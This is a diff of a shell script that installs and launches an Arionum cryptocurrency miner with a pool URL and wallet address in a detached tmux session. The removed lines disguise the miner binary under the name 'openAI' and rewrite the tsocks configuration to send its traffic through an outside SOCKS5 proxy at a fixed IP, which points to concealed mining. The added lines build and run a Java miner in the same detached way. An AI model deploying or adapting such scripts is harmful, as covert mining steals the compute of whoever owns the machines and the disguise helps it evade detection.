@@ -80,8 +80,17 @@ route add 117.7.81.138 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com/ > ip.txt
 
-wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.5_ubuntu16_server.tar.gz
-tar -zxf ariocppminer_v0.9.5_ubuntu16_server.tar.gz
+#! /bin/bash
+set -x #echo on
+sudo apt-get update
+sudo apt-get install openjdk-8-jdk maven git gcc make -y
+sudo apt-get install build-essential -y
+cd 
+git clone git://github.com/Programmerdan/arionum-java
+cd arionum-java/arionum-miner
+git checkout investigate
+touch config.cfg
+chmod 755 config.cfg
 echo "pool
 http://aropool.com/
 47VJTSocAAVkfoJ2o2fW4bQiiukiiAFNvWPsCfgcWZ5FZthq7HJxBMHo9rRe8jvRfSireoZYLJGWY2GTaYWs4M54
@@ -89,13 +98,9 @@ http://aropool.com/
 enhanced
 true
 `hostname`" > config.cfg
-
-
-mv ariocppminer_avx2 openAI
-sed -i 's/192.168.0.0/0.0.0.0/g' /etc/tsocks.conf
-sed -i 's/255.255.255.0/0.0.0.0/g' /etc/tsocks.conf
-sed -i 's/192.168.0.1/173.242.121.53/g' /etc/tsocks.conf
-sed -i 's/server_port = 1080/server_port = 9080/g' /etc/tsocks.conf
-sed -i 's/server_type = 4/server_type = 5/g' /etc/tsocks.conf
-
-tsocks tmux new-session -d -s my_session1 './openAI'
+mvn clean package
+chmod +x build-argon.sh
+./build-argon.sh
+chmod +x run.sh
+sudo apt-get install tmux -y
+tmux new-session -d -s my_session './run.sh'
